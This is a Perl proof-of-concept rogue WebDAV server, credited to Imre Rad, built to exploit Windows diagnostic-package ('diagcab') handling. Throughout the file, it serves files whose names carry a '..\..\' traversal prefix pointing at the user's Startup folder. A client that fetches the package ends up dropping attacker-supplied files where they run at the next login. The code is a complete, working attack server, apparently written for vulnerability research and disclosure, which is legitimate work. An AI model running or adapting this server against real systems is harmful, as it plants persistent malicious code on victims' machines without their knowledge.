#!/usr/bin/perl

# Rogue webdav poc server by Imre Rad returning ..\.. components in filenames.

use strict;
use warnings;
use IO::Socket::INET;

my $MALICIOUS_PATH_PREFIX = $ENV{MALICIOUS_PATH_PREFIX} || "..\\..\\..\\..\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
my $port = $ENV{PORT}; # heroku gonna dispatch the port to listen on as an environment variable
die "Usage: set the PORT environment variable to control where the webdav server should be listening" if(!$port);

$| = 1;

my %files;
register_files_in_dir("legit", "package");
register_files_in_dir("malicious", "package", 1);
register_files_in_dir("config", "config");

my $socket = new IO::Socket::INET (
  LocalHost => '0.0.0.0',
  LocalPort => $port,
  Proto => 'tcp',
  Listen => 5,
  Reuse => 1
);

die "cannot create socket: $!\n" unless $socket;
mylog("diagcab webdav server waiting for client connections on port $port");

while(1) {
   my $client_socket = $socket->accept();
   my $client_address = $client_socket->peerhost();
   my $client_port = $client_socket->peerport();
   mydebug("connection from $client_address:$client_port");
   
   my $data = "";
   $client_socket->recv($data, 1024);
   mydebug("\n\n\nreceived:\n$data\n");
   
   if($data =~ /^OPTIONS /) {
      $data = "HTTP/1.1 200 OK\r\n".
	          "Date: Wed, 31 Jul 2019 15:30:25 GMT\r\n".
			  "Server: Apache\r\n".
			  "DAV: 1,2\r\n".
			  "DAV: <http://apache.org/dav/propset/fs/1>\r\n".
			  "MS-Author-Via: DAV\r\n".
			  "Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK,UNLOCK\r\n".
			  "Content-Length: 0\r\n".
			  "Keep-Alive: timeout=15, max 200\r\n".
			  "Connection: Keep-Alive\r\n".
			  "\r\n";
   }
   elsif($data =~ m#^GET /(.+)/? HTTP#) {
      my $fn = $1;
	  my $v = findfile($fn);
	  if($v) {
	      mylog("serving $fn for $client_address");
     	  my $l = length($v);
   
		  $data = "HTTP/1.1 200 Ok\r\n".
				  "Date: Wed, 31 Jul 2019 15:30:38 GMT\r\n".
				  "Server: Apache\r\n".
				  "Content-Length: $l\r\n".
				  "Content-Type: application/octet-stream\r\n".
				  "\r\n".
				  $v;   
	  }else{
	     $data = e404($fn);
	  }
	  
   }
   elsif($data =~ m#^PROPFIND /(.+/.+) HTTP#) { # getting info about a file
      my $fn = $1;
	  my $v = findfile($fn);
	  if($v) {
     	  my $l = length($v);
		  my $txt = '
	<D:response xmlns:lp1="DAV:">
	   <D:href>/'.$fn.'</D:href>
	   <D:propstat>
		  <D:prop>
			 <lp1:resourcetype/>
			 <lp1:getcontentlength>'.$l.'</lp1:getcontentlength>
			 <lp1:getlastmodified>Wed, 12 Jul 2017 09:48:09 GMT</lp1:getlastmodified>
			 <lp1:creationdate>2017-08-08T12:32:59Z</lp1:creationdate>
		  </D:prop>
	   </D:propstat>
	</D:response>';
		  my $body = '<?xml version="1.0" encoding="utf-8"?>
	<D:multistatus xmlns:D="DAV:" xmlns:ns0="DAV:">'.$txt.'</D:multistatus>';
	
	
	     $data = resp207($body);
	  }else{
	     $data = e404($fn);
	  }

   }
   elsif($data =~ m#^PROPFIND /(.*)/? HTTP#) { # listing a dir
      my $dir = $1;
	  $data = list_dir($data, $dir);
   }
   else {
      mydebug("UNKNOWN REQUEST");
	  $data = e404("foo");
   }
   
   if($data) {
      mydebug("Sending response: $data\n");
	  $client_socket->send($data);
   }
   
   shutdown($client_socket, 1);
}

$socket->close();


sub slurp {
   my $path = shift;
   my $size = -s $path;
   die "Error: $path does not seem to exist" if(!$size);
   open(my $h, "<$path") or die "Cant: $!";
   binmode($h);
   read($h, my $buf, $size);
   close($h);
   return $buf;
}

sub register_file {
   my $d = shift;
   my $n = shift;
   my $c = shift;
   $files{$d}{$n} = $c;
}

sub e404 {
  my $fn = shift;
  mydebug("ERROR: Client requested a file which is not registered: $fn");
  return "HTTP/1.1 404 Not-found\r\n\r\n";
}

sub findfile {
  my $requested_fn = shift;

  my $b_requested_fn = my_basename($requested_fn);

  for my $dir (keys %files) {  
	  for my $afn (keys %{$files{$dir}}) {	  
		  my $b_afn = my_basename($afn);
		  return $files{$dir}{$afn} if($b_afn eq $b_requested_fn);
	  }
  }
}

sub my_basename {
  my $fn = shift;
  return $1 if($fn =~ m#.+(?:\\|/)(.+)#);
  return $fn;  
}

sub register_files_in_dir {
  my $src_dir = shift;
  my $dst_dir = shift;
  my $malicious = shift;
  opendir(my $d, $src_dir) or die "cant opendir $src_dir: $!";
  while(my $filename = readdir($d)) {
     next if($filename =~ /^\./);
	 my $content = slurp("$src_dir/$filename");
     register_file($dst_dir, $malicious ? $MALICIOUS_PATH_PREFIX.$filename : $filename, $content);
  }
  closedir($d);
}

sub mydebug {
  return if(!$ENV{DEBUG});
  
  my $msg = shift;
  print STDERR "$msg\n";
}

sub mylog {
  my $msg = shift;
  print STDOUT "$msg\n";
}

sub resp207 {
   my $body = shift;
   return     "HTTP/1.1 207 Multi-Status\r\n".
	          "Date: Wed, 31 Jul 2019 15:30:38 GMT\r\n".
			  "Server: Apache\r\n".
			  "Content-Length: ".length($body)."\r\n".
			  'Content-Type: text/xml; charset="utf-8"'."\r\n".
			  "\r\n".
			  $body;
   
}

sub list_dir {
   my $data = shift;
   my $dir = shift;
   
   my $canondir = $dir ? "/$dir/" : "/";
   $canondir =~ s#/+$#/#;

   my %dir_to_list = %files;
   my $path_depth = 0;
   if($dir) {
      return if(!$files{$dir});
	  %dir_to_list = %{$files{$dir}};
	  $path_depth = 1;
   }

   return if($data !~ /Depth: (\d+)/);
   my $header_depth = $1;
   my $dir_only = $header_depth == 0;

   my $file_entries = "";
   if(!$dir_only) {
	  for my $fn (keys %dir_to_list) {
	     my $fullfn = "$canondir$fn";
		 mydebug("listing stuff: $fullfn");
		 my $filetype = "";
		 if($dir) {
	        my $l = length($files{$dir}{$fn});
            $filetype = '<lp1:resourcetype/><lp1:getcontentlength>'.$l.'</lp1:getcontentlength>';

		 }else {
            $filetype = '<lp1:resourcetype><D:collection/></lp1:resourcetype>';
		 }
		 
      $file_entries .= '
<D:response xmlns:lp1="DAV:">
   <D:href>'.$fullfn.'</D:href>
   <D:propstat>
      <D:prop>'.
	    $filetype.
'
	     <lp1:getlastmodified>Wed, 12 Jul 2017 09:48:09 GMT</lp1:getlastmodified>
         <lp1:creationdate>2017-08-08T12:32:59Z</lp1:creationdate>
      </D:prop>
   </D:propstat>
</D:response>';
	  
	  }
	}
	  
    my $body = '<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:" xmlns:ns0="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/" xmlns:g0="DAV:">
<D:href>'.$canondir.'</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:getlastmodified>Wed, 12 Jul 2017 10:10:09 GMT</lp1:getlastmodified>
<lp1:creationdate>2017-08-08T12:32:59Z</lp1:creationdate>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>'.
		   $file_entries.
		   '</D:multistatus>';

   return resp207($body);

}
